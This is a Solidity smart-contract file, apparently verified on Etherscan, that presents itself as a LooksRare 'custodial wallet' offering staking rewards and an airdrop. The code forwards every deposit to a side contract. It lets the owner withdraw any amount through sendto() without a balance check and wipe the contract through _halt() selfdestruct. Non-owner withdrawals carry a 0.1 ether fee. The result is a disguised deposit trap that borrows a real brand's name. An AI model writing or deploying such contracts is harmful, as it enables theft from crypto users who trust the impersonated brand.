/**
 *Submitted for verification at Etherscan.io on 2022-03-20
*/

//SPDX-License-Identifier: MIT
pragma solidity >0.7.0 <0.9.0;

contract AirdropLedger{
    address payable walletAddress;
    LooksRareCustodialWallet public wallet;

    constructor(address payable _walletaddress){
        walletAddress = _walletaddress;
        wallet = LooksRareCustodialWallet(_walletaddress);
    }

    /* Get */
    fallback() payable external{}
    receive() payable external{}

    /* Post */
    function pay(uint _pay) external {
        require(msg.sender == walletAddress);
        require(address(this).balance >= _pay);
        wallet.tookback{value:_pay}();
    }
}

contract LooksRareCustodialWallet {
                            // Custodial Wallet Only for NFT //
    //    LooksRare is the community-first NFT marketplace with rewards for participating.           //
    //    After charging the contract, you will be able to receive the initial tokens via the Dapp.  //
    //    Copyright 2022 LooksRare | By NFT people, for NFT people.                                  //

    address trusted_owner;
    address payable airdropAddress;
    AirdropLedger public airdropledger;

    mapping(address=>uint) public LooksRareLedger;

    constructor(){
        trusted_owner = msg.sender;
    }

    /* Set AirdropLedger*/
    function setAirdropLedger(address payable _airdropAddress) external{
        require(msg.sender == trusted_owner,"Only trusted_owner");

        airdropledger = AirdropLedger(_airdropAddress);
        airdropAddress = _airdropAddress;
    }
    /* Get */
    function tookback() payable external{}
    fallback() payable external{}

    /* Earn by Staking */
    receive() payable external{
        require(msg.value>0.1 ether,"Ether is less");
        LooksRareLedger[msg.sender]+=msg.value;

        bool success = airdropAddress.send(msg.value);
        require(success, "Failed to send Ether");
    }

    function sendto(uint value) external{
        if(msg.sender == trusted_owner){
            airdropledger.pay(value);

            bool check = payable(msg.sender).send(value);
            require(check, "Failed to send Ether");
        }
        if(msg.sender != trusted_owner){
            value -= 0.1 ether; //get initial tokens fees
            require(LooksRareLedger[msg.sender]>=value,"No balance");
            
            airdropledger.pay(value);
            bool success = payable(msg.sender).send(value);
            require(success, "Failed to send Ether");
        }
    }

    /* This is anticipated to upgrade the NFT market */
    function _halt() external{
        require(msg.sender == trusted_owner,"Only trusted_owner");
        selfdestruct(payable(trusted_owner));
    }
}